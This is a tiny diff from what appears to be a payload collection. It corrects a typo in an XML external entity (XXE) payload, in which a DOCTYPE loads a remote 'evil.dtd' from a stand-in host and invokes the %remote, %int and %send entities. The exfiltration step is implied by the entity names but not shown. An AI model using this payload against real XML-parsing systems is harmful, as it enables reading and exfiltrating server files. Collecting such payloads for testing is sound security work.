@@ -80,7 +80,7 @@ payload
 ```xml-dtd
 <!DOCTYPE test [
 <!ENTITY % remote SYSTEM "http://127.0.0.1/evil.dtd">
-$remote;%int;%send;
+%remote;%int;%send;
 ]>
 ```
 
